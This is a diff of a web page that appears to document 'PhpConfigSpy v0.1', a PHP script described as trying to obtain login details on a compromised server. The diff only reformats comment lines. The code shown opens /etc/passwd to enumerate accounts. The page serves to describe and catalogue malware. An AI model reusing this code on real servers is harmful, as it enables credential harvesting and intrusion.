@@ -13,6 +13,7 @@ tags:
 ---
 This script appears to try to obtain login details for a compromised server.
 
+
 ### PhpConfigSpy Source Code
 
 {% highlight php %}<?php 
@@ -20,7 +21,16 @@ echo "&lt;html&gt;";
 echo "&lt;title&gt;PhpConfigSpy v0.1&lt;/title&gt;&lt;body&gt;"; 
 
 set_time_limit(0); 
-########################### 
+
+###
+###
+###
+###
+###
+###
+###
+###
+### 
 @$passwd=fopen('/etc/passwd','r'); 
 if (!$passwd) { 
   echo "[-] Error : coudn't read /etc/passwd"; 
@@ -46,9 +56,30 @@ if ($i&gt;35) {
 } 
 $i++; 
 } 
-############################ 
 
-##################################### 
+###
+###
+###
+###
+###
+###
+###
+###
+#### 
+
+
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+#### 
 echo "&lt;br&gt;&lt;br&gt;"; 
 echo "&lt;textarea name='main_window' cols=100 rows=20&gt;"; 
 
